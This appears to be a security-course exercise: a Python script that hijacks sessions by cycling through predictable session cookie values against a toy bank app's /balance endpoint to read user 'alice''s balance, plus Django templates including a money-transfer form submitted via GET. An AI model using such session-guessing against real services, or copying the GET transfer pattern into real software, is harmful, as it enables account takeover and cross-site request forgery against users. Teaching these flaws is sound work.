# hijacksession.py
import sys
	import requests
	import json
	 
	 
	def test_session(address):
		url = "{}/balance".format(address)
		balance = None
		for i in range(1, 12):
			cookies = dict(sessionid='session-{}'.format(i))
			r = requests.get(url, cookies=cookies)
			username = r.json()['username']
			# Check if the username is Alice
			if username == 'alice':
				balance = int(r.json()['balance'])
				break
	 
		return balance
	 
	def main(argv):
		address = sys.argv[1]
		print(test_session(address))
	 
	 
	# This makes sure the main function is not called immediatedly
	# when TMC imports this module
	if __name__ == "__main__": 
		if len(sys.argv) != 2:
			print('usage: python %s address' % sys.argv[0])
		else:
			main(sys.argv)
			


# index.html
<!DOCTYPE html>
	<html xmlns="http://www.w3.org/1999/xhtml">
	    <head>
	        <title>Bank Transfer</title>
	    </head>
	 
	 
	    <body>
			<h1>Your account</h1>
	 
	        <table>
			<tr>
			<th style="text-align:left">Username: <td>{{user.username}} 
			<tr>
			<th style="text-align:left">Balance:  <td>{{user.account.balance}}
			</table>
	 
	 
	        <form action='logout/' method="POST">
				{% csrf_token %}
	            <input type="submit" value="Logout"/>
	        </form>
			
	        <h2>Transfer money</h2>
	 
	        <form action='transfer/' method="GET">
	            <span>To:</span><br/>
	            <select name="to">
				{% for account in accounts %}
	                <option value="{{account.user.username}}">{{account.user.username}}</option>
				{% endfor %}
	            </select><br/>
	 
	            <span>Amount:</span><br/>
	            <input type="number" name="amount"/><br/>
	 
	            <input type="submit" value="Transfer"/>
	        </form>
	    </body>
	 
	 
	    </body>
	</html>



# login.html
<h2>Login</h2>
<form method="post">
	{% csrf_token %}
	{{ form.as_p }}
	<button type="submit">Login</button>
</form>